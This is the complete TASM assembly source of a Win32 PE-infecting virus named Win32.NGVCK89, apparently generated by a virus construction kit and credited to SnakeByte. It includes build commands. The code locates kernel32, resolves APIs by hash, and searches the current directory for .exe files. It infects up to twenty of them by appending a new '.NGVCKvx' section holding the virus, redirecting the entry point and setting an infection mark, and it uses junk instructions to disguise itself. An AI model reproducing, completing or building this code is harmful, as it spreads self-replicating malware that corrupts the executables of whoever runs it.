              
;
;
; Win32.NGVCK89 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK89
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : adding a new section 
;  API Search             : Simple CRC I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 50
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 mov eax, dword ptr [esp]
                                        ; add esp, 4
 dec esp
 add esp, 5d
 sub eax, offset Delta
                                        ; mov ebp, eax
                                        ; clear ebp
 mov ebp, 28707d
 sub ebp, 28707d
 add ebp, eax
 jmp KernelSearchStart


;                  [ ///// * Data * \\\\\ ]

Data:
 filealign   dd 0h
 Trash1      dd 0h
 MapAddress  dd 0h
 MapHandle   dd 0h
 InfCounter  dd 0h
 Misc1       dd 0h

 KernelMZ    dd 0h
 KernelPE    dd 0h
 db 'Win32.NGVCK89 created by SnakeByte',0
 NTableVA    dd 0h
 sectionalign   dd 0h
 AlignReg2   dd 0h
 OldBase     dd 400000h
 ATableVA    dd 0h
 filemask    db '*.eXE',0
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

newsection:                           ; Settings for the new section
 nsname           db '.NGVCKvx'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable


 APIOffsets:
 XCloseHandle           dd 0h
 XMapViewOfFile         dd 0h
 XFindNextFileA         dd 0h
 XFindFirstFileA        dd 0h
 XUnmapViewOfFile       dd 0h
 XSetFileAttributesA    dd 0h
 XFindClose             dd 0h
 XGetFileAttributesA    dd 0h
 XCreateFileA           dd 0h
 XCreateFileMappingA    dd 0h

 PEheader    dd 0h
 NewSize     dd 0h
 OldEIP      dd 0h
 AlignReg1   dd 0h
 counter     dw 0h
 NewEIP      dd 0h
 TempAPI     dd 0h

 APINames:
 dd 'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h
 dd 'Ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Fi'+'nd'+'Ne'+'xt'+'Fi'+'le'+'A'*100h
 dd 'Fi'+'nd'+'Fi'+'rs'+'tF'+'il'+'eA'
 dd 'Un'+'ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Se'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Fi'+'nd'+'Cl'+'os'+'e'*100h
 dd 'Ge'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'

 OTableVA    dd 0h
 Attributes  dd 0h
 FindHandle  dd 0h
 FileHandle  dd 0h




;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldEIP]
 pop ecx

 mov dword ptr [ebp+retEIP], ecx

                                        ; clear edx
 mov edx, -28085d
 add edx, 28085d
 add edx, dword ptr [ebp+OldBase]

 push edx
 pop dword ptr [ebp+retBase]



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
                                        ; add ebp, 1
 add ebp, 1d
 sub ebp, 1
 jz FirstGenHost
 mov ebx,12345678h
 org $-4
 retBase dd 0h
 add ebx,12345678h
 org $-4
 retEIP dd 0h
 jmp ebx



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
                                        ; mov ebx, -1
 push -1d
 pop ebx
 and ebx, dword ptr [ebp+OldEIP]

 push ebx
 pop dword ptr [ebp+retEIP]

                                        ; mov ebx, -1
 mov ebx, ( -1d + 31d )
 sub ebx, 31d
 and ebx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 xor dword ptr [ebp+retBase], ebx




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov [ebp+InfCounter], 20d
 lea ebx, [ebp+filemask]

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 sub eax, -1d
                                        ; add eax, 1
 add eax, 1d
 dec eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
                                        ; mov ebx, -1
 mov ebx, ( -1d + 12d )
 sub ebx, 12d
 and ebx, dword ptr [ebp+InfCounter]
 or ebx, ebx
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop ebx
                                        ; mov eax, 4
 mov eax, 0
 add eax, 4d
 sub esp, eax
                                        ; round to pages
 ror ebx, 16d
 shl ebx, 16d
                                        ; add ebx, 1
 inc ebx
GetKernelLoop:
                                        ; clear ecx
 and ecx, 0
 sub ebx, 1
 mov cx, word ptr [ebx+03ch]
 test cx,0f800h
 jnz GetKernelLoop
 cmp ebx, dword ptr [ebx+ecx+34h]
 jnz GetKernelLoop
 push ebx
 pop dword ptr [ebp+KernelMZ]
 mov eax, [ebx+3Ch]
 add eax, ebx
 mov [KernelPE+ebp], eax

 lea ebx, GetApis
 add ebx, ebp

 push ebx
ret


;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
                                        ; clear edx
 and edx, 0
 mov eax, dword ptr [ebp+AlignReg1]
 mov ecx, dword ptr [ebp+AlignReg2]
 div ecx
                                        ; add eax, 1
 sub eax, -1d
 mul ecx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov ebx, 80000000h or 40000000h
 inc eax                                ; Trash
 push ebx
 lea ebx, [ebp+WFD_szFileName]
 xchg ebx, edx

 push edx
 call dword ptr [ebp+XCreateFileA]

 cmp eax, -1
 je Closed

 mov dword ptr [ebp+FileHandle], -1
 and dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop ecx
 push ecx
 push 0
 push ecx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 mov ebx, ebx                           ; Trash
 call dword ptr [ebp+XCreateFileMappingA]
 push eax
 pop dword ptr [ebp+MapHandle]
 pop ecx
 test eax, eax
 jz CloseFile
 push ecx
 push 0
 push 0
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 or eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edx Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



 mov eax, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear esi
 and esi, 0
 add esi, [eax+78h]
 add esi, [ebp+KernelMZ]
                                        ; add esi, 28
 inc esi
 add esi, 27d
False add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], eax
                                        ; get NTableVA
 mov eax, dword ptr [esi]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], eax
                                        ; add esi, 4
 dec esi
 add esi, 5d
False add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], eax
                                        ; clear ebx
 xor ebx, ebx
 xor ebx, dword ptr [ebp+NTableVA]
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h


SearchNextApi1:                         ; search for the API's
 push ebx
 mov eax, dword ptr [ebx]
 add eax, [ebp+KernelMZ]
                                        ; mov ebx, eax
 push eax
 pop ebx
                                        ; mov esi, ebx
 push ebx
 pop esi
 push esi
 push edx
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; edx Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; simple CRC Api Search by Lethalmind
 push dword ptr [edx]
 pop eax
 LoopChsksm:
                                        ; clear ecx
 xor ecx, ecx
 mov cl, byte ptr [esi]
                                        ; add esi, 1
 sub esi, -1d
 shl cx,8d
 sub eax, ecx
 test cx, cx
 jz LoopConti
                                        ; clear ecx
 mov ecx, 52068d
 sub ecx, 52068d
 mov cl, byte ptr [esi]
 sub eax, ecx
                                        ; add esi, 1
 sub esi, -1d
 or cx, cx
 jnz LoopChsksm
LoopConti:
                                        ; add eax, 1
 sub eax, -1d
 sub eax, 1
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop edx
 pop esi
 pop ebx
                                        ; add ebx, 4
 inc ebx
 add ebx, 3d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2002h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 12d
                                        ; retrieve the offset
                                        ; clear eax
 push 0
 pop eax
 mov ax, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl eax, 1                             ; multiply with 2
 add eax, dword ptr [ebp+OTableVA]
 push eax
 pop edi
 movzx eax, word ptr [edi]
 clc
 rcl eax, 2h
 add eax, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ebx, dword ptr [eax]
 add ebx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], 0
 xor dword ptr [ebp+TempAPI], ebx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ecx
 popad
 jmp ExecuteHost



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 lea edx, [ebp+WFD_nFileSizeLow]
 xchg ecx, edx

 cmp dword ptr [ecx], 20000d
 jbe NoInfection
                                        ; get and remove file attributes
 mov ebx, offset WFD_szFileName
 add ebx, ebp

 push ebx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 lea edi, [ebp+WFD_szFileName]
 xchg ebx, edi


 push ebx
 call dword ptr [ebp+XSetFileAttributesA]
 or eax, eax
 jz NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; clear eax
 xor eax, eax
 xor eax, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [eax], 'ZM'
 je Goodfile
                                        ; mov edx, 55154
 mov edx, ( 55154d xor 4d )
 xor edx, 4d
 cmp edx, 0
 jne Notagoodfile
Goodfile:
                                        ; clear ecx
 and ecx, 0
 mov cx, word ptr [eax+3Ch]
 test ecx, ecx
 jz Notagoodfile
 mov edx, dword ptr [eax+3Ch]
                                        ; check if header lies inside the file
 cmp edx, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add edx, eax
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [edx], 'EP'
 je Goodfile2
 jmp Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edx+4Ch], 'NGVC'
 jz Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection2

Notagoodfile:
 call UnMapFile

NoInfection2:

                                        ; restore the file attributes
                                        ; clear ecx
 push 0
 pop ecx
 xor ecx, dword ptr [ebp+Attributes]
 push ecx
 mov ecx, offset WFD_szFileName
 add ecx, ebp

 push ecx
 call dword ptr [ebp+XSetFileAttributesA]

NoInfection:
ret




;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea eax, [ebp+WIN32_FIND_DATA]

 push eax
 push ebx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], -1
 and dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov ebx, offset WIN32_FIND_DATA
 add ebx, ebp

 push ebx
                                        ; clear ecx
 mov ecx, 0
 xor ecx, dword ptr [ebp+FindHandle]
 push ecx
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 mov ecx, ebp
 add ecx, offset WFD_szFileName

                                        ; mov ebx, 276
 mov ebx, 276d

ClearOldData2:
 mov byte ptr [ecx], 0h
                                        ; add ecx, 1
 add ecx, 1d
 dec ebx
 jnz ClearOldData2
 popad
ret





;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 mov ebx, NumberOfApis

                                        ; load API Names and Offsets
 lea esi, [ebp+APIOffsets]

 lea edx, [ebp+APINames]


GetApisLoop: 

                                        ; search 'em
                                        ; edx points to the CRC
                                        ; esi points to the offset

 call SearchAPI1
                                        ; add edx, 4
 dec edx
 add edx, 5d
 mov eax, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], -1
 and dword ptr [esi], eax
                                        ; add esi, 4
 dec esi
 add esi, 5d
 dec ebx
 jnz GetApisLoop
 mov eax, offset Outbreak
 add eax, ebp

 push eax
ret



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 push dword ptr [ebp+MapAddress]
 pop eax
                                        ; retrieve PE - Header
 mov edx, [eax+3Ch]
 add edx, eax
                                        ; get File Alignment
                                        ; add edx, 60
 add edx, 60d
 mov ebx, [edx]
                                        ; mov ecx, 60
 mov ecx, 60d
 sub edx, ecx
 mov dword ptr [ebp+filealign], 0
 add dword ptr [ebp+filealign], ebx
                                        ; clear esi
 mov esi, -37468d
 add esi, 37468d
 xor esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov eax, dword ptr [esi+3Ch]
 add eax, esi
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], eax
                                        ; get old Entrypoint
 mov ebx, dword ptr [eax+28h]
 push ebx
 pop dword ptr [ebp+OldEIP]
 mov edx, dword ptr [eax+34h]
 mov dword ptr [ebp+OldBase], edx
 mov edx, [eax+38h]
 mov dword ptr [ebp+sectionalign], -1
 and dword ptr [ebp+sectionalign], edx
                                        ; Get last section
 mov ebx, [eax+74h]
 shl ebx, 3
                                        ; clear ecx
 xor ecx, ecx
 mov cx, word ptr [eax+6h]
 mov edx, 28h
 pushad
 mov eax, ecx
 mul edx
 mov dword ptr [ebp+Misc1], 0
 add dword ptr [ebp+Misc1], eax
 sub dword ptr [ebp+Trash1], 1106799    ; Trash
 popad
                                        ; clear ecx
 and ecx, 0
 xor ecx, dword ptr [ebp+Misc1]
 add eax, 78h
 add eax, ebx
 add eax, ecx
 lea edx, [ebp+newsection]


 xchg edx, eax
 push edx
                                        ; Calculate the RVA of the new section
 mov eax, [edx-5*8+8d]
 add eax, [edx-5*8+12d]
 mov ebx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], eax
 mov dword ptr [ebp+AlignReg2], -1
 and dword ptr [ebp+AlignReg2], ebx
 mov dword ptr [ebp+nsphysicalsize], 0
 add dword ptr [ebp+nsphysicalsize], eax
 Call Align
                                        ; mov eax, -1
 mov eax, -1d
 and eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], eax
                                        ;  calculate the virtual size of the new section
 mov ecx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], ecx
 Call Align
                                        ; mov eax, -1
 mov eax, -1d
 and eax, dword ptr [ebp+AlignReg1]
 push eax
 pop dword ptr [ebp+nsvirtualsize]
                                        ; calculate physical offset
 mov ecx,[edx-5*8+20d]
 add ecx,[edx-5*8+16d]
 mov ebx,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], ecx
 mov dword ptr [ebp+AlignReg2], 0
 xor dword ptr [ebp+AlignReg2], ebx
 Call Align
                                        ; mov ebx, -1
 mov ebx, ( -1d xor 12d )
 xor ebx, 12d
 and ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsphysicaloffset], ebx
                                        ; calculate new size
 push dword ptr [ebp+filealign]
 pop ecx
 mov eax, ebx
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], ecx
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], eax
 call Align
                                        ; clear eax
 mov eax, 0
 xor eax, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], -1
 and dword ptr [ebp+NewSize], eax
 pushad
 Call UnMapFile2
 sub dword ptr [ebp+Trash1], 185412     ; Trash
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 xor dword ptr [ebp+WFD_nFileSizeLow], eax
 call CreateMap
 jc NoEXE
                                        ; mov ebx, 64
 mov ebx, ( 64d - 38d )
 add ebx, 38d
 pop esi
 mov edi, ebp
 shl eax, 26d                           ; Trash
 add edi, offset newsection

WriteNewSectionLoop:
 mov dh, byte ptr [edi]
 mov byte ptr [esi], dh
                                        ; add esi, 1
 add esi, 1d
 dec ebx
                                        ; add edi, 1
 add edi, 1d
 cmp ebx, 0
 jne WriteNewSectionLoop
                                        ; increase section numbers
                                        ; mov ebx, -1
 mov ebx, ( -1d - 14d )
 add ebx, 14d
 and ebx, dword ptr [ebp+PEheader]
 inc word ptr [ebx+06h]
 mov edx, dword ptr [ebp+nsRVA]
 mov dword ptr [ebp+NewEIP], edx
                                        ; set new EIP
 mov dword ptr  [ebx+28h], edx
                                        ; set infection mark
 mov dword ptr [ebx+4Ch], -1d
 and dword ptr [ebx+4Ch], 'NGVC'
 mov ebx, dword ptr [ebp+nsphysicaloffset]
 push ebx
                                        ; Append Virus
 pop edi
 mov eax, VirusSize
 mov esi, ebp
 add esi, offset Virus

 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec eax
 jnz AppendLoop
                                        ; decrease Infection Counter
                                        ; clear ecx
 mov ecx, 6998d
 sub ecx, 6998d
 xor ecx, dword ptr [ebp+InfCounter]
 sub ecx, 1
 mov dword ptr [ebp+InfCounter], -1
 and dword ptr [ebp+InfCounter], ecx
 clc
ret

NoEXE:
 pop ebx
 stc
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

